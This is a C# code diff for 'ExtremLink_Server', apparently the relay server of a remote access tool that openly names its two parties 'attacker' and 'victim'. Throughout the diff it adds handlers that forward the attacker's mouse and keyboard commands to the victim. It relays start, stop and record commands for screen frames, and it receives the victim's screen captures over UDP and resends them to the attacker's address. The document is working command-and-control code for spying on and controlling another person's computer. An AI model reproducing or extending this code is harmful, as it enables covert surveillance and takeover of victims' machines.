@@ -134,11 +134,10 @@ namespace ExtremLink_Server.Classes
             // & - frames handling.
             while (true)
             {
-                this.currentFrame = this.GetFrame();
+                this.SendFrame(this.ConvertBitmapImageToRenderTargetBitmap(this.GetFrame()));
                 Thread.Sleep(1000);
             }
         }
-
         private async Task HandleAttackerTcpCommunication()
         {
             // The function gets nothing.
@@ -148,6 +147,7 @@ namespace ExtremLink_Server.Classes
             // ! - Database functionality
             // & - Frames handling
             // % - Mouse handling
+            // ⌨ - Keyboard handling
             // $ - Sessions handling
             while (true)
             {
@@ -159,6 +159,15 @@ namespace ExtremLink_Server.Classes
                     {
                         case "!":
                             this.HandleUsersDatabaseMessages(data, TypeOfClient.attacker);
+                            break;
+                        case "&":
+                            this.HandleFramesMessages(data, TypeOfClient.attacker);
+                            break;
+                        case "%":
+                            this.HandleMouseMessages(data);
+                            break;
+                        case "⌨":
+                            this.HandleKeyboardMessages(data);
                             break;
                     }
                 }
@@ -173,6 +182,7 @@ namespace ExtremLink_Server.Classes
             // ! - Database functionality
             // & - Frames handling
             // % - Mouse handling
+            // ⌨ - Keyboard handling
             // $ - Sessions handling
             while (true)
             {
@@ -184,15 +194,12 @@ namespace ExtremLink_Server.Classes
                         case "!":
                             this.HandleUsersDatabaseMessages(data, TypeOfClient.victim);
                             break;
-                        case "&":
-                            break;
                     }
                 }
             }
         }
         
-        
-        // Handling clients' users managment messages function:       
+        // Handling clients' users managment type messages functions:       
         private void HandleLoginMessages(string data, TypeOfClient typeOfClient)
         {
             // Input: A string which represents a login message and the type of the client.
@@ -278,109 +285,228 @@ namespace ExtremLink_Server.Classes
             }
         }
 
-
-
-
-        public BitmapImage GetImageOfPNGFile(string fileName)
+        // Handling clients' frames type messages functions:
+        private void HandleFramesMessages(string data, TypeOfClient typeOfClient)
         {
-            // Load the PNG file as a BitmapImage
-            BitmapImage bitmapImage = new BitmapImage();
+            // Input: A string which represents a message about frames from the client and the type of the client.
+            // Output: The function handles with the message. 
+            switch (data)
+            {
+                case "StartSendFrames":
+                    this.victim.SendTCPMessageToClient("&", "StartSendFrames");
+                    break;
+
+                case "PauseSendFrames":
+                    this.victim.SendTCPMessageToClient("&", "PauseSendFrames");
+                    break;
+
+                case "StopSendFrames":
+                    this.victim.SendTCPMessageToClient("&", "StopSendFrames");
+                    break;
+
+                case "StartRecord":
+                    this.victim.SendTCPMessageToClient("&", "StartRecord");
+                    break;
+            }
+        }
+
+        // Handling attacker mouse commands messages function:
+        private void HandleMouseMessages(string data)
+        {
+            // Input: A string which represents a message about mouse commands from the attacker.
+            // Output: The function handles with the given message.
+            this.victim.SendTCPMessageToClient("%", data);
+        }
+
+        // Handling attacker keyboard commands messages function:
+        private void HandleKeyboardMessages(string data)
+        {
+            // Input: A string which represents a message about keyboard commands from the attacker.
+            // Output: The function handles with the given message.
+            this.victim.SendTCPMessageToClient("⌨", data);
+        }
+
+
+
+        // Getting frames function:
+        public BitmapImage GetFrame()
+        {
             try
             {
-                using (var stream = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                // Store received packets
+                Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
+                int streamId = -1;
+                int totalPackets = -1;
+
+                // Receive packets
+                while (receivedPackets.Count < totalPackets || totalPackets == -1)
                 {
-                    bitmapImage.BeginInit();
-                    bitmapImage.CacheOption = BitmapCacheOption.OnLoad; // Load the data into memory immediately
-                    bitmapImage.StreamSource = stream; // Use the FileStream as the source
-                    bitmapImage.EndInit();
-                    bitmapImage.Freeze(); // Make the BitmapImage thread-safe
+                    // Buffer size for each packet
+                    byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
+                    int bytesRead = this.victim.UdpSocket.Receive(buffer);
+
+                    // Extract metadata
+                    int receivedStreamId = BitConverter.ToInt32(buffer, 0);
+                    int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
+                    int packetIndex = BitConverter.ToInt32(buffer, 8);
+
+                    // Ensure packets are part of the same stream
+                    if (streamId == -1) streamId = receivedStreamId;
+                    if (totalPackets == -1) totalPackets = receivedTotalPackets;
+                    if (streamId != receivedStreamId) continue;
+
+                    // Extract segment data
+                    byte[] segmentData = new byte[bytesRead - 12];
+                    Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
+
+                    // Store segment if not already received
+                    if (!receivedPackets.ContainsKey(packetIndex))
+                    {
+                        receivedPackets[packetIndex] = segmentData;
+                    }
                 }
+
+                // Reassemble the file content
+                using (var fileStream = new FileStream("tempFrame.png", FileMode.Create))
+                {
+                    for (int i = 0; i < totalPackets; i++)
+                    {
+                        if (receivedPackets.TryGetValue(i, out var segment))
+                        {
+                            fileStream.Write(segment, 0, segment.Length);
+                        }
+                        else
+                        {
+                            throw new Exception($"Missing packet {i}");
+                        }
+                    }
+                }
+
+                // Load the PNG file to a BitmapImage object
+                var bitmap = new BitmapImage();
+                using (var stream = new FileStream("tempFrame.png", FileMode.Open, FileAccess.Read))
+                {
+                    bitmap.BeginInit();
+                    bitmap.CacheOption = BitmapCacheOption.None;
+                    bitmap.StreamSource = stream;
+                    bitmap.EndInit();
+                }
+                bitmap.Freeze();
+                return bitmap;
+
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Error loading frame: {ex.Message}");
+                MessageBox.Show($"An error occurred: {ex.Message}");
+                return null;
             }
-
-            return bitmapImage;
         }
 
-        // Getting frame function
-
-        public BitmapImage GetFrame()
+        // Sending frame functions:
+        private byte[] ConvertRenderTargetBitmapToByteArray(RenderTargetBitmap renderTarget)
         {
-            lock (fileLock)
+            // The function gets a RenderTargetBitmap object.
+            // The function returns the given object as a byte array.
+            PngBitmapEncoder encoder = new PngBitmapEncoder();
+            encoder.Frames.Add(BitmapFrame.Create(renderTarget));
+
+            using (MemoryStream ms = new MemoryStream())
             {
-                try
-                {
-                    // Store received packets
-                    Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
-                    int streamId = -1;
-                    int totalPackets = -1;
-
-                    // Receive packets
-                    while (receivedPackets.Count < totalPackets || totalPackets == -1)
-                    {
-                        // Buffer size for each packet
-                        byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
-                        int bytesRead = this.udpSocket.Receive(buffer);
-
-                        // Extract metadata
-                        int receivedStreamId = BitConverter.ToInt32(buffer, 0);
-                        int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
-                        int packetIndex = BitConverter.ToInt32(buffer, 8);
-
-                        // Ensure packets are part of the same stream
-                        if (streamId == -1) streamId = receivedStreamId;
-                        if (totalPackets == -1) totalPackets = receivedTotalPackets;
-                        if (streamId != receivedStreamId) continue;
-
-                        // Extract segment data
-                        byte[] segmentData = new byte[bytesRead - 12];
-                        Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
-
-                        // Store segment if not already received
-                        if (!receivedPackets.ContainsKey(packetIndex))
-                        {
-                            receivedPackets[packetIndex] = segmentData;
-                        }
-                    }
-
-                    // Reassemble the file content
-                    using (var fileStream = new FileStream("tempFrame.png", FileMode.Create))
-                    {
-                        for (int i = 0; i < totalPackets; i++)
-                        {
-                            if (receivedPackets.TryGetValue(i, out var segment))
-                            {
-                                fileStream.Write(segment, 0, segment.Length);
-                            }
-                            else
-                            {
-                                throw new Exception($"Missing packet {i}");
-                            }
-                        }
-                    }
-
-                    // Load the PNG file to a BitmapImage object
-                    var bitmap = new BitmapImage();
-                    using (var stream = new FileStream("tempFrame.png", FileMode.Open, FileAccess.Read))
-                    {
-                        bitmap.BeginInit();
-                        bitmap.CacheOption = BitmapCacheOption.None;
-                        bitmap.StreamSource = stream;
-                        bitmap.EndInit();
-                    }
-                    bitmap.Freeze();
-                    return bitmap;
-
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show($"An error occurred: {ex.Message}");
-                    return null;
-                }
+                encoder.Save(ms);
+                return ms.ToArray();
             }
         }
+        public RenderTargetBitmap ConvertBitmapImageToRenderTargetBitmap(BitmapImage bitmapImage)
+        {
+            int width = bitmapImage.PixelWidth;
+            int height = bitmapImage.PixelHeight;
+
+            // Create a RenderTargetBitmap with the same size as the BitmapImage
+            RenderTargetBitmap renderTargetBitmap = new RenderTargetBitmap(width, height, 96, 96, PixelFormats.Pbgra32);
+
+            // Create a DrawingVisual to render the BitmapImage
+            DrawingVisual drawingVisual = new DrawingVisual();
+            using (DrawingContext drawingContext = drawingVisual.RenderOpen())
+            {
+                drawingContext.DrawImage(bitmapImage, new System.Windows.Rect(0, 0, width, height));
+            }
+
+            // Render the DrawingVisual to the RenderTargetBitmap
+            renderTargetBitmap.Render(drawingVisual);
+
+            return renderTargetBitmap;
+        }
+        private void CreatePngImageFile(byte[] fileContent)
+        {
+            string fileName = "tempFrame.png";
+            string filePath = Path.Combine(Directory.GetCurrentDirectory(), fileName);
+
+            try
+            {
+                // Write the byte array to a file
+                using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
+                {
+                    fileStream.Write(fileContent, 0, fileContent.Length);
+                }
+
+                // MessageBox.Show($"File created successfully at: {filePath}", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"An error occurred while creating the PNG file: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+            }
+        }
+        private byte[] GetFileContent(string fileName)
+        {
+            try
+            {
+                // Read all bytes of the file into a byte array
+                byte[] fileContent = File.ReadAllBytes(fileName);
+                return fileContent;
+            }
+            catch (Exception ex)
+            {
+                // Handle exceptions such as file not found or permission issues
+                throw new IOException($"Failed to read file content: {ex.Message}", ex);
+            }
+        }
+        public void SendFrame(RenderTargetBitmap renderTarget)
+        {
+            // Convert RenderTargetBitmap to byte array
+            byte[] frameData = this.ConvertRenderTargetBitmapToByteArray(renderTarget);
+
+            // Create a temporary PNG file for debugging and future use
+            this.CreatePngImageFile(frameData);
+
+            // Get the file content
+            byte[] fileContent = GetFileContent("tempFrame.png");
+
+            // Define packet size (MTU-safe)
+            const int packetSize = 1400; // Keeping under the MTU limit
+            int totalPackets = (int)Math.Ceiling((double)fileContent.Length / packetSize);
+
+            // Generate a random stream ID to identify this data stream
+            int streamId = new Random().Next(1, int.MaxValue);
+
+            // Send packets
+            for (int i = 0; i < totalPackets; i++)
+            {
+                // Calculate packet bounds
+                int offset = i * packetSize;
+                int size = Math.Min(packetSize, fileContent.Length - offset);
+
+                // Construct packet (12 bytes of metadata + segment data)
+                byte[] packet = new byte[size + 12];
+                BitConverter.GetBytes(streamId).CopyTo(packet, 0);          // 4 bytes: Stream ID
+                BitConverter.GetBytes(totalPackets).CopyTo(packet, 4);     // 4 bytes: Total packets
+                BitConverter.GetBytes(i).CopyTo(packet, 8);                // 4 bytes: Packet index
+                Array.Copy(fileContent, offset, packet, 12, size);         // Segment data
+
+                // Send packet
+                this.attacker.UdpSocket.SendTo(packet, new IPEndPoint(IPAddress.Parse(this.attacker.IpAddress), this.attacker.UDP_PORT));
+            }
+        }
+
 
 
         // SQL database queries functions
